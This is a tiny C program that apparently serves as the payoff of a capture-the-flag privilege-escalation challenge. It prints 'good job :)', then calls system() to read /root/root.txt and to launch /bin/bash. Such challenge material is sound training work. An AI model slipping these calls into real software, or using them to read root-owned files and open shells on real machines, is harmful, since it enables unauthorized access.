#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	printf("good job :)\n");
	system("cat /root/root.txt");
	system("/bin/bash");
	return 0;
}
